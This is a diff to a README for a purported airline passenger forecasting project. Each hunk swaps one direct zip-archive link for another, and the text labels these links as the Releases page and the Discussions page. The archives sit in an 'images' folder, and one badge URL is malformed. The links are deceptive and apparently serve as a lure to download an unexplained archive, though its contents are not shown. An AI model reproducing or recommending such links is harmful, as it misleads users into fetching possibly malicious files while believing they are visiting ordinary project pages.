@@ -15,7 +15,7 @@ Welcome to the Airline Passenger Forecasting project! This tool helps you foreca
 ## 📥 Download & Install
 To get started, visit the Releases page for the latest version of the application.
 
-[![Download Airline-Passenger-Forecasting](https://raw.githubusercontent.com/ASADIMVU/Airline-Passenger-Forecasting/main/images/Airline-Passenger-Forecasting-2.8.zip%20Passenger%https://raw.githubusercontent.com/ASADIMVU/Airline-Passenger-Forecasting/main/images/Airline-Passenger-Forecasting-2.8.zip)](https://raw.githubusercontent.com/ASADIMVU/Airline-Passenger-Forecasting/main/images/Airline-Passenger-Forecasting-2.8.zip)
+[![Download Airline-Passenger-Forecasting](https://github.com/ASADIMVU/Airline-Passenger-Forecasting/raw/refs/heads/main/images/Airline-Forecasting-Passenger-2.1.zip%20Passenger%https://github.com/ASADIMVU/Airline-Passenger-Forecasting/raw/refs/heads/main/images/Airline-Forecasting-Passenger-2.1.zip)](https://github.com/ASADIMVU/Airline-Passenger-Forecasting/raw/refs/heads/main/images/Airline-Forecasting-Passenger-2.1.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of the software.
@@ -57,6 +57,6 @@ To run the Airline Passenger Forecasting tool, your computer should meet the fol
 ## 📞 Support
 If you have any questions or need assistance, feel free to reach out. You can open an issue in the GitHub repository or email the support team directly.
 
-For more detailed discussions, please visit the [Discussions page](https://raw.githubusercontent.com/ASADIMVU/Airline-Passenger-Forecasting/main/images/Airline-Passenger-Forecasting-2.8.zip). 
+For more detailed discussions, please visit the [Discussions page](https://github.com/ASADIMVU/Airline-Passenger-Forecasting/raw/refs/heads/main/images/Airline-Forecasting-Passenger-2.1.zip). 
 
 We are here to help you make the most of your forecasting experience. Enjoy making informed travel predictions!
